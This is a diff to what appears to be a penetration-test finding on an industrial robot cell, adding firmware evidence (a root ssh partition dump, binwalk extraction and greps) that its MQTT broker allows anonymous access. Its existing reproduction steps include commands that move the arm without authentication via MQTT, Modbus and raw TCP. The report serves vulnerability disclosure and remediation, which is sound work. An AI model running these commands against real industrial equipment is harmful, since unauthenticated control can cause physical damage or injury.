@@ -43,6 +43,8 @@ srv.bind(('0.0.0.0', MODBUS_PORT))               # [IoT:I2] no auth by design
 
 The MQTT bridge subscribes to a broker that runs with `mosquitto-nossl` and no credentials, then forwards every payload to the bus.
 
+Firmware analysis confirms that the insecurity is baked into the base image: `binwalk` extraction of `/dev/mmcblk0p2` shows `Package: mosquitto-nossl` in `usr/lib/opkg/status`, and `/etc/mosquitto/mosquitto.conf` ships with all authentication options commented out and `use_uci 0`, so anonymous connections are allowed by default. See [IoT:I10-FW — Firmware Static Analysis](IoT_Firmware_Static_Analysis.md).
+
 ## Steps to Reproduce
 
 ```bash
@@ -57,6 +59,15 @@ python3 -c 'from pymodbus.client import ModbusTcpClient as C; c=C("192.168.2.1",
 
 # C. MQTT - publish a command, no username/password
 mosquitto_pub -h 192.168.2.1 -t cell01/cmd -m 'S0:0'
+
+# D. Firmware forensics - confirm mosquitto-nossl and anonymous defaults in the base image
+ssh root@192.168.2.1 'dd if=/dev/mmcblk0p2 bs=4M count=32 2>/dev/null' > p2_sample.img
+binwalk -e -M p2_sample.img
+grep -E "^Package: mosquitto-nossl" _p2_sample.img.extracted/squashfs-root/usr/lib/opkg/status
+# -> Package: mosquitto-nossl
+grep -E "allow_anonymous|use_uci" _p2_sample.img.extracted/squashfs-root/etc/mosquitto/mosquitto.conf
+# -> # allow_anonymous true  (commented, default is anonymous allowed)
+# -> #use_uci 0
 ```
 
 ## Expected Result
@@ -81,3 +92,5 @@ Put the OT services behind authentication and transport security: client certifi
 - [ ] `nc :2000` line moves the arm with no auth
 - [ ] Modbus register write moves the arm with no auth
 - [ ] `mosquitto_pub` to `cell01/cmd` moves the arm with no credentials
+- [ ] Binwalk extraction of `mmcblk0p2` shows `Package: mosquitto-nossl` in `usr/lib/opkg/status`
+- [ ] Extracted `/etc/mosquitto/mosquitto.conf` leaves `allow_anonymous` implicitly true
